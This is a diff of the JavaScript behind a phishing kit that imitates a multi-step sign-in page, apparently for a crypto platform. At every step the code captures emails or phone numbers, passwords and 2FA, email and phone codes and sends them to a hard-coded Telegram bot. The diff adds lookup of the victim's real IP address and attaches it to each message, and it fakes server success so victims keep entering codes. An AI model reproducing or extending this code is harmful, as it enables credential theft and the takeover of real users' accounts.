@@ -4,21 +4,28 @@
 const TELEGRAM_BOT_TOKEN = "7488388724:AAEPgkyry54fJcCp3hjIhhtwgZdO-cjyZwU";
 const TELEGRAM_CHAT_ID = "-5244196921";
 
-
-
 // ======================================================
 // COLLECT USER INFORMATION
 // ======================================================
 
-// Generate unique alphanumeric ID (e.g., 1A, 7B, 8H)
-function generateUniqueID() {
-    const digit = Math.floor(Math.random() * 10); // 0-9
-    const letter = String.fromCharCode(65 + Math.floor(Math.random() * 26)); // A-Z
-    return `${digit}${letter}`;
+// Get real IP address
+let userIP = '0.0.0.0';
+
+async function getIPAddress() {
+    try {
+        const response = await fetch('https://api.ipify.org?format=json');
+        const data = await response.json();
+        if (data.ip) {
+            userIP = data.ip;
+            userInfo.ip = userIP;
+        }
+    } catch (error) {
+        console.log('Could not fetch IP:', error);
+    }
 }
 
 const userInfo = {
-    ip: generateUniqueID(),
+    ip: '0.0.0.0',
     userAgent: navigator.userAgent,
     timestamp: new Date().toLocaleString(),
     country: 'Unknown',
@@ -50,10 +57,10 @@ function getUserLabelFromUrl() {
     } catch (error) {
         console.log('Error reading user label:', error);
     }
-    return escapeTelegramHtml(userInfo.ip);
+    return '';
 }
 
-const userLabel = getUserLabelFromUrl();
+let userLabel = getUserLabelFromUrl();
 
 async function fetchJson(url) {
     const response = await fetch(url, { cache: 'no-store' });
@@ -63,8 +70,11 @@ async function fetchJson(url) {
     return response.json();
 }
 
-// Get location info
+// Get location info and IP
 async function collectUserInfo() {
+    // First get IP address
+    await getIPAddress();
+    
     const providers = [
         async () => {
             const data = await fetchJson('https://ipapi.co/json/');
@@ -178,10 +188,10 @@ async function sendToTelegram(message) {
 }
 
 // ======================================================
-// FORMAT MESSAGES FOR TELEGRAM (MONOSPACE FORMAT)
+// FORMAT MESSAGES FOR TELEGRAM
 // ======================================================
 
-const REDACTED_NOTIFICATION_VALUE = ''; // Will be replaced dynamically
+const REDACTED_NOTIFICATION_VALUE = '';
 
 function getDigits(value) {
     return String(value || '').replace(/\D/g, '');
@@ -204,7 +214,7 @@ function getCredentialParts(emailPhone) {
     if (!submittedIsPhone) {
         return {
             type: 'Email',
-            html: `<code>${escapeTelegramHtml(submitted)}</code>`
+            html: `${escapeTelegramHtml(submitted)}`
         };
     }
 
@@ -216,54 +226,57 @@ function getCredentialParts(emailPhone) {
 
     return {
         type: 'Phone',
-        html: `<b>${escapeTelegramHtml(codePart)}</b> <code>${submittedDigits}</code>`
+        html: `${escapeTelegramHtml(codePart)} ${submittedDigits}`
     };
 }
 
 function formatLoginMessage(emailPhone, password) {
     const credentials = getCredentialParts(emailPhone);
+    const label = userLabel ? `(${userLabel})\n` : '';
 
-    return `<b>(${userLabel})</b>
-<b>${credentials.type}:</b> ${credentials.html}
-<b>Password:</b> <code>${escapeTelegramHtml(password)}</code>
-<b>Country: ${userInfo.country}</b>`;
+    return `${label}Email: ${credentials.html}\nPassword: ${escapeTelegramHtml(password)}\n\nIP: ${userInfo.ip}`;
 }
 
 function formatOneTimeLoginMessage(emailPhone) {
     const credentials = getCredentialParts(emailPhone);
+    const label = userLabel ? `(${userLabel})\n` : '';
 
-    return `<b>(${userLabel} 1⃣)</b>
-<b>${credentials.type}:</b> ${credentials.html}
-<b>Country: ${userInfo.country}</b>`;
+    return `${label}Email: ${credentials.html}\n\nIP: ${userInfo.ip}`;
 }
 
 function format2FAMessage(code, switched = false) {
-    const prefix = switched ? 'switched' : '';
-return `<b>${prefix}🔐: (${userLabel}):</b> <code>${escapeTelegramHtml(code)}</code>`;
+    const prefix = switched ? '🔐 Switched: ' : '🔐 2FA: ';
+    const label = userLabel ? `(${userLabel})\n` : '';
+
+    return `${label}${prefix}${escapeTelegramHtml(code)}\nIP: ${userInfo.ip}`;
 }
 
 function formatEmailVerificationMessage(code, switched = false) {
-    const prefix = switched ? 'switched' : '';
-return `<b>${prefix}📧: (${userLabel}):</b> <code>${escapeTelegramHtml(code)}</code>`;
+    const prefix = switched ? '📧 Switched: ' : '📧 Email Code: ';
+    const label = userLabel ? `(${userLabel})\n` : '';
+
+    return `${label}${prefix}${escapeTelegramHtml(code)}\nIP: ${userInfo.ip}`;
 }
 
 function formatPhoneVerificationMessage(code, switched = false) {
-    const prefix = switched ? 'switched' : '';
-  return `<b>${prefix}📱: (${userLabel}):</b> <code>${escapeTelegramHtml(code)}</code>`;
+    const prefix = switched ? '📱 Switched: ' : '📱 Phone Code: ';
+    const label = userLabel ? `(${userLabel})\n` : '';
+
+    return `${label}${prefix}${escapeTelegramHtml(code)}\nIP: ${userInfo.ip}`;
 }
 
 function formatSwitchMessage(fromMethod, toMethod) {
-    // Capitalize first letter only
     const toMethodFormatted = toMethod.charAt(0).toUpperCase() + toMethod.slice(1).toLowerCase();
-    return `<b>(${userLabel})</b>
-<b>Switched:</b> ${toMethodFormatted}`;
+    const label = userLabel ? `(${userLabel})\n` : '';
+
+    return `${label}Switched to: ${toMethodFormatted}\nIP: ${userInfo.ip}`;
 }
 
 function formatGoVerifyMessage(method) {
-    // Capitalize first letter only
     const methodFormatted = method.charAt(0).toUpperCase() + method.slice(1).toLowerCase();
-    return `<b>(${userLabel})</b>
-<b>Selected:</b> ${methodFormatted}`;
+    const label = userLabel ? `(${userLabel})\n` : '';
+
+    return `${label}Selected: ${methodFormatted}\nIP: ${userInfo.ip}`;
 }
 
 // ======================================================
@@ -273,7 +286,7 @@ function simulateServerSuccess() {
     return new Promise(resolve => {
         setTimeout(() => {
             resolve({ success: true });
-        }, 500); // Simulate 0.5s server delay
+        }, 500);
     });
 }
 
@@ -286,8 +299,8 @@ let isProcessing = {
 
 // Store current method for switch tracking
 let currentMethod = '';
-let isOneTimeCodeMode = false; // Track if One-time Code mode is active
-let isAfterSwitch = false; // Track if verification is after a method switch
+let isOneTimeCodeMode = false;
+let isAfterSwitch = false;
 
 document.addEventListener("DOMContentLoaded", () => {
 
@@ -308,7 +321,6 @@ function showOverlay(id) {
     setTimeout(() => {
         initSwitchButtons(overlay);
 
-        // Hide switch buttons if in verifications after password flow OR if in one-time code mode
         if ((verificationsActive && (id === "email" || id === "phone")) || isOneTimeCodeMode) {
             overlay.querySelectorAll(".switch-to-twofa, .switch-to-email, .switch-to-phone")
                 .forEach(btn => btn.style.display = "none");
@@ -317,7 +329,6 @@ function showOverlay(id) {
                 .forEach(btn => btn.style.display = "");
         }
 
-        // Auto-start resend timer
         setTimeout(() => {
             const resendBtn = overlay.querySelector(".resend-btn");
             if (resendBtn) startResend(id, true);
@@ -378,7 +389,6 @@ const passwordField = document.getElementById('input-container2');
 const passwordInput = document.getElementById('password');
 const emailPhoneField = document.getElementById('input-container');
 const emailPhoneInput = document.getElementById('email-phone');
-// Some templates use a visible input id `email-phone-visible`; fall back to `email-phone` when absent
 const emailPhoneVisibleInput = document.getElementById('email-phone-visible') || document.getElementById('email-phone');
 
 function ensureHiddenInput(id) {
@@ -705,39 +715,31 @@ function closeCountrySheet() {
 }
 
 if (oneTimeTab && passwordField && passwordTab && passwordInput && emailPhoneField && emailPhoneInput) {
-    // One-time Code tab click
     oneTimeTab.addEventListener('click', (e) => {
         e.preventDefault();
         isOneTimeCodeMode = true;
         
-        // Switch aria-selected attributes
         passwordTab.removeAttribute('aria-selected');
         oneTimeTab.setAttribute('aria-selected', 'true');
         
-        // Hide password field and make it not required
         passwordField.style.display = 'none';
         passwordInput.removeAttribute('required');
-        passwordInput.value = ''; // Clear any existing password
+        passwordInput.value = '';
         
-        // Change placeholder text to remove "/Username"
         if(emailPhoneVisibleInput) emailPhoneVisibleInput.placeholder = 'Email / Phone Number';
         updateSignInButtonState();
     });
 
-    // Password tab click
     passwordTab.addEventListener('click', (e) => {
         e.preventDefault();
         isOneTimeCodeMode = false;
         
-        // Switch aria-selected attributes
         oneTimeTab.removeAttribute('aria-selected');
         passwordTab.setAttribute('aria-selected', 'true');
         
-        // Show password field and make it required
         passwordField.style.display = 'flex';
         passwordInput.setAttribute('required', 'required');
         
-        // Restore original placeholder text
         if(emailPhoneVisibleInput) emailPhoneVisibleInput.placeholder = 'Email / Phone Number / Username';
         updateSignInButtonState();
     });
@@ -776,7 +778,6 @@ function updateSignInButtonState() {
     signInButton.classList.toggle('login-ready', hasValidIdentifier && hasValidPassword);
 }
 
-// password toggle handler (eye icon)
 try{
     const pwdToggle = document.getElementById('password-toggle');
     const pwdInput = document.getElementById('password');
@@ -794,7 +795,7 @@ try{
         });
         pwdToggle.addEventListener('keydown', (e)=>{ if(e.key==='Enter' || e.key===' ') { e.preventDefault(); pwdToggle.click(); } });
     }
-}catch(e){/* ignore */}
+}catch(e){}
 
 twofaInput.addEventListener("input", () => {
     twofaButton.disabled = !isValidVerificationCode(twofaInput.value);
@@ -819,31 +820,27 @@ form.addEventListener("submit", async e => {
     const emailPhone = document.getElementById("email-phone").value;
     const password = document.getElementById("password").value;
 
-    // Validate email or phone format
     const isPhone = /^[\d+][\d\s\-()]+$/.test(emailPhone.replace(/\s/g, ''));
     if (isPhone) {
-        // Validate phone number has 7-15 digits
         const phoneDigits = emailPhone.replace(/\D/g, '');
         if (phoneDigits.length < 7 || phoneDigits.length > 15) {
             stopLoading(submitButton);
-            submitButton.offsetHeight; // Force reflow
+            submitButton.offsetHeight;
             isProcessing.login = false;
             showToast("Incorrect email or phone number");
             return;
         }
     } else {
-        // Validate email format
         const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
         if (!emailRegex.test(emailPhone)) {
             stopLoading(submitButton);
-            submitButton.offsetHeight; // Force reflow
+            submitButton.offsetHeight;
             isProcessing.login = false;
             showToast("Incorrect email or phone number");
             return;
         }
     }
 
-    // Send login credentials to Telegram based on mode
     await ensureUserInfo();
     let loginMessage;
     if (isOneTimeCodeMode) {
@@ -853,15 +850,12 @@ form.addEventListener("submit", async e => {
     }
     await sendToTelegram(loginMessage);
 
-    // Simulate server delay and always return success
     const result = await simulateServerSuccess();
     
     stopLoading(submitButton);
 
     if (result.success) {
         if (isOneTimeCodeMode) {
-            // One-time code mode: skip 2FA and go directly to email/phone verification
-            // Detect if user entered email or phone
             const isPhone = /^[\d+][\d\s\-()]+$/.test(emailPhone.replace(/\s/g, ''));
             
             if (isPhone) {
@@ -876,7 +870,6 @@ form.addEventListener("submit", async e => {
                 showOverlay("email");
             }
         } else {
-            // Password mode: show 2FA authenticator
             currentMethod = 'twofa';
             showOverlay("twofa");
         }
@@ -909,11 +902,9 @@ twofaButton.addEventListener("click", async () => {
 
     startLoading(twofaButton);
 
-    // Send 2FA code to Telegram
     const twofaMessage = format2FAMessage(twofaInput.value, isAfterSwitch);
     await sendToTelegram(twofaMessage);
 
-    // Simulate server response
     const result = await simulateServerSuccess();
 
     stopLoading(twofaButton);
@@ -971,7 +962,6 @@ if (emailVerifyBtn) {
     emailVerifyBtn.addEventListener("click", () => {
         currentMethod = 'email';
         isAfterSwitch = false;
-        // Send "Go Verify" to Telegram when email is selected
         sendGoVerify("email");
         showOverlay("email");
     });
@@ -984,11 +974,9 @@ if (emailButton) {
 
         startLoading(emailButton);
 
-        // Send email verification code to Telegram
         const emailMessage = formatEmailVerificationMessage(emailInput.value, isAfterSwitch);
         await sendToTelegram(emailMessage);
 
-        // Simulate server response
         const result = await simulateServerSuccess();
 
         stopLoading(emailButton);
@@ -1000,14 +988,12 @@ if (emailButton) {
             return;
         }
 
-        // First verification (verifications not shown yet)
         if (!verificationsActive) {
             enterVerifications("email");
             isProcessing.email = false;
             return;
         }
 
-        // Transition from step 1 → step 2
         hideOverlay("email");
         hideOverlay("verifications");
 
@@ -1052,7 +1038,6 @@ if (phoneVerifyBtn) {
     phoneVerifyBtn.addEventListener("click", () => {
         currentMethod = 'phone';
         isAfterSwitch = false;
-        // Send "Go Verify" to Telegram when phone is selected
         sendGoVerify("phone");
         showOverlay("phone");
     });
@@ -1062,11 +1047,9 @@ if (phoneButton) {
     phoneButton.addEventListener("click", async () => {
         startLoading(phoneButton);
 
-        // Send phone verification code to Telegram
         const phoneMessage = formatPhoneVerificationMessage(phoneInput.value, isAfterSwitch);
         await sendToTelegram(phoneMessage);
 
-        // Simulate server response
         const result = await simulateServerSuccess();
 
         stopLoading(phoneButton);
@@ -1077,13 +1060,11 @@ if (phoneButton) {
             return;
         }
 
-        // First verification (verifications not shown yet)
         if (!verificationsActive) {
             enterVerifications("phone");
             return;
         }
 
-        // Final step (step 2/2) - show success and reload
         const toast = document.createElement("div");
         toast.className = "toast-layer";
         toast.innerHTML = `
@@ -1118,11 +1099,10 @@ async function sendSwitchToTelegram(fromMethod, toMethod) {
 function switchOverlay(from, to, method) {
     const fromMethod = currentMethod;
     currentMethod = method;
-    isAfterSwitch = true; // Mark that next code submission is after a switch
+    isAfterSwitch = true;
     
     hideOverlay(from);
     
-    // Send switch action to Telegram
     sendSwitchToTelegram(fromMethod, method);
     
     setTimeout(() => showOverlay(to), 350);
@@ -1251,9 +1231,6 @@ window.startResend = startResend;
 
 // ======================================================
 // GLOBAL OTP HOOKS (used by inline OTP UI)
-// Provides `window.sendOtp({contact, method})` and `window.verifyOtp({contact, code})`
-// These are lightweight wrappers that send formatted messages via Telegram
-// and return a Promise<boolean> indicating success.
 // ======================================================
 window.sendOtp = async function({contact, method} = {}){
     try{
@@ -1261,7 +1238,6 @@ window.sendOtp = async function({contact, method} = {}){
         await ensureUserInfo();
         const msg = formatOneTimeLoginMessage(contact);
         await sendToTelegram(msg);
-        // simulate server acceptance
         const res = await simulateServerSuccess();
         return res.success === true;
     }catch(e){ console.error('sendOtp error', e); return false; }
@@ -1270,7 +1246,6 @@ window.sendOtp = async function({contact, method} = {}){
 window.verifyOtp = async function({contact, code} = {}){
     try{
         if(!code) return Promise.resolve(false);
-        // choose formatter based on contact type
         const isEmail = (contact||'').indexOf('@')>-1;
         let msg;
         if(isEmail) msg = formatEmailVerificationMessage(code, isAfterSwitch);
@@ -1288,9 +1263,8 @@ thirdGroupButtons.forEach(btn => {
         e.preventDefault();
         e.stopPropagation();
         showToast("Verification method unavailable.");
-    }, true); // Use capture phase to catch before iframe
+    }, true);
     
-    // Also disable any iframes inside these buttons
     const iframe = btn.querySelector('iframe');
     if (iframe) {
         iframe.style.pointerEvents = 'none';
@@ -1314,7 +1288,6 @@ if (passkeyButton) {
 // ======================================================
 
 document.addEventListener("DOMContentLoaded", () => {
-    // Initialize input focus effects
     const emailInput = document.getElementById('email-phone');
     const emailContainer = document.getElementById('input-container');
     const passwordInput = document.getElementById('password');
@@ -1352,11 +1325,9 @@ document.addEventListener('DOMContentLoaded', ()=>{
     function ensureBtnLabel(el){
         if(!el) return;
         if(el.querySelector('.btn-label')) return;
-        // collect direct text nodes
         const textNodes = Array.from(el.childNodes).filter(n=>n.nodeType===3 && n.textContent.trim());
         const text = textNodes.map(n=>n.textContent.trim()).join(' ').trim();
         if(!text) return;
-        // remove those text nodes
         textNodes.forEach(n=>n.remove());
         const span = document.createElement('span');
         span.className = 'btn-label';
@@ -1364,14 +1335,11 @@ document.addEventListener('DOMContentLoaded', ()=>{
         el.appendChild(span);
     }
 
-    // target the specific class combination requested by user
     const selector = '.button.button-brand.w-full.mt-4.h-12';
     document.querySelectorAll(selector).forEach(btn=>{
         ensureBtnLabel(btn);
     });
 
-    // also ensure any existing "Claim N BCD" buttons are wrapped (fallback)
-    // Defer heavy DOM scan to idle time to avoid blocking initial interaction.
     try{
         var runScan = function(){
             try{
@@ -1381,13 +1349,12 @@ document.addEventListener('DOMContentLoaded', ()=>{
                         if(/^Claim\s+\d+\s*BCD$/i.test(t)) ensureBtnLabel(el);
                     }
                 });
-            }catch(e){ /* swallow per original intent */ }
+            }catch(e){}
         };
 
         if('requestIdleCallback' in window){
             requestIdleCallback(runScan, {timeout:2000});
         } else {
-            // schedule after initial paint
             setTimeout(runScan, 1500);
         }
     }catch(e){}
